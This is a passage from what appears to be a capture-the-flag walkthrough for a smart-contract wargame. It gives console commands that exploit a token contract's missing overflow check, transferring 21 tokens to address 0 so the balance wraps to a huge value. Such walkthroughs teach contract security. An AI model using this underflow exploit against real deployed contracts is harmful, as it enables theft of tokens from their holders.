`web3.toDecimal(await contract.balanceOf(player))`

2. Token contract doesn't check for overflow errors. We will defeat the contract by overflowing our balance. Transfer 21 tokens to address 0.  
`await contract.transfer(0, 21)`  

3. Check our new balance.  
`web3.toDecimal(await contract.balanceOf(player))`
